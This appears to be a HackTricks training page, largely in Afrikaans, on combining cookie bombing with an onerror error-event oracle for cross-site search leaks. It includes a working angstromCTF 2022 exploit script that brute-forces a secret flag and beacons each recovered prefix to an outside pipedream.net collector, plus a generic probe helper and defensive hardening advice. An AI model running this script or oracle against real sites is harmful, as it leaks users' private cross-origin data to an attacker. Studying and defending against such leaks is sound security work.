# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Hierdie tegniek kombineer:
- Cookie bombing: die slagoffer se blaaier met baie/groot cookies vir die teiken-origin volstop sodat opvolgende versoeke bediener-/versoeklimiete tref (request header size, URL size in redirects, ens.).
- Error-event oracle: peil 'n cross-origin endpoint met 'n <script> (of ander subresource) en onderskei state met onload vs onerror.

High level idea
- Vind 'n teiken-endpoint waarvan die gedrag verskil tussen twee state wat jy wil toets (bv. soek “hit” vs “miss”).
- Verseker dat die “hit” pad 'n swaar redirect-ketting of lang URL sal veroorsaak terwyl die “miss” pad kort bly. Vergroot die request headers deur baie cookies sodat slegs die “hit” pad die bediener laat misluk met 'n HTTP-fout (bv. 431/414/400). Die fout skakel die onerror-gebeurtenis om en word 'n orakel vir XS-Search.

When does this work
- Jy kan die slagoffer se blaaier daartoe bring om cookies na die teiken te stuur (bv. cookies is SameSite=None of jy kan dit in 'n first-party konteks stel via 'n popup window.open).
- Daar is 'n app-funksie wat jy kan misbruik om arbitrêre cookies te stel (bv. “save preference” endpoints wat beheerde insetname/waardes in Set-Cookie omskakel) of om post-auth redirects te maak wat aanvallerbeheerde data in die URL inkorporeer.
- Die bediener reageer anders in die twee state en, met opgeblese headers/URL, oorskry een toestand 'n limiet en stuur 'n foutrespons terug wat onerror aktiveer.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large word algemeen teruggestuur wanneer cookies die request headers opblaas; 414 URI Too Long of 'n bedienerspesifieke 400 kan teruggestuur word vir lang versoekdoelwitte. Enigeen van hierdie lei tot 'n mislukte subresource load en aktiveer onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Die volgende script (uit 'n publieke writeup) misbruik 'n funksie wat die aanvaller toelaat arbitrêre cookies in te voeg, en laai dan 'n cross-origin search endpoint as 'n script. Wanneer die query korrek is, voer die bediener 'n redirect uit wat, saam met die cookie bloat, bedienergrense oorskry en 'n foutstatus teruggee, sodat script.onerror afgevuur word; anders gebeur niks.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Waarom die popup (window.open)?
- Moderne blaaiers blokkeer toenemend third-party cookies. Om 'n top-level window na die target oop te maak maak die cookies first-party, sodat Set-Cookie responses van die target vasbly en die cookie-bomb stap moontlik maak, selfs met third-party cookie-beperkings.

Generic probing helper
As jy reeds 'n manier het om baie cookies op die target origin (first-party) te stel, kan jy hierdie minimale oracle hergebruik teen enige endpoint waarvan sukses/mislukking tot verskillende netwerk-uitkomste (status/MIME/redirect) lei:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tips om die orakel te bou
- Dwing die “positiewe” toestand swaarder te wees: skakel ’n ekstra redirect net wanneer die predikaat waar is, of laat die omleidings-URL onbeperkte gebruikersinvoer weerspieël sodat dit saam met die geraamde voorvoegsel groei.
- Blaas koptekste op: herhaal cookie bombing totdat ’n konsekwente fout op die “sware” pad waargeneem word. Bedieners stel gewoonlik ’n grens vir kopteksgrootte en sal vroeër faal wanneer baie cookies teenwoordig is.
- Stabiliseer: voer verskeie parallelle cookie-set operasies uit en peil herhaaldelik om die invloed van tyd- en kasgeraas deur gemiddeldes te verminder.

Related XS-Search tricks
- URL-lengte-gebaseerde orakels (geen cookies nodig) kan gekombineer of in plaas daarvan gebruik word as jy ’n baie lang versoekdoel kan afdwing:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Verdedigingsmaatreëls en verharding
- Maak sukses- en mislukking-antwoorde ononderskeibaar:
- Vermy voorwaardelike omleidings of groot verskille in responsgrootte tussen toestande. Gee dieselfde status, dieselfde content type, en soortgelyke inhoudslengte terug ongeag die toestand.
- Blokkeer kruisdomein subresource-peilings:
- SameSite cookies: stel sensitiewe cookies op SameSite=Lax of Strict sodat subresource-versoeke soos <script src> hulle nie dra nie; verkies Strict vir auth tokens waar moontlik.
- Fetch Metadata: dwing ’n Resource Isolation Policy af om kruisdomein subresource-lading te verwerp (bv. as Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): stel CORP: same-origin (of ten minste same-site) vir endpunte wat nie bedoel is om as cross-origin subresources ingevoeg te word nie.
- X-Content-Type-Options: nosniff en korrekte Content-Type op JSON/HTML endpunte om load-as-script vreemdhede te vermy.
- Verminder kopteks/URL-versterking:
- Beperk die aantal/grootte van cookies wat gestel word; ontsmet funksies wat ewekansige formvelde in Set-Cookie omskakel.
- Normaliseer of kortknip gereflekterde data in omleidings; vermy om aanvaller-beheerde lang stringe in Location URLs in te sluit.
- Hou bedienergrense konsekwent en faal uniform (vermy spesiale foutbladsye slegs vir een tak).

Aantekeninge
- Hierdie klas aanvalle word breed bespreek as “Error Events” XS-Leaks. Die cookie-bomb stap is net ’n gerieflike manier om net een tak oor bedienergrense te druk, wat ’n betroubare booleaanse orakel produseer.



## Verwysings
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (algemeen met baie cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
